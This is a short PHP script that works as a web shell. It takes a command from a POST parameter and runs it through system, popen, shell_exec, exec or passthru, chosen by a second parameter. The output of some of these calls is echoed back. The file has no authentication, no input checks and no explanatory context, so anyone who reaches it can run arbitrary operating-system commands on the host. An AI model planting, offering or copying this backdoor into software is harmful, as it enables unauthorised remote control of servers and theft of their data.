<?php
switch ($_POST['functionz']) {
case "system":
	system(stripslashes($_POST['cmd']));
	break;
	
case "popen":
	$handle = popen($_POST['cmd'].' 2>&1', 'r');
	echo "'$handle'; " . gettype($handle) . "\n";
	$read = fread($handle, 2096);
	echo $read;
	pclose($handle);
	break;
	
case "shell_exec":
	shell_exec(stripslashes($_POST['cmd']));
	break;
	
case "exec":
	exec(stripslashes($_POST['cmd']));
	break;
	
case "passthru":
	passthru(stripslashes($_POST['cmd']));
}
?>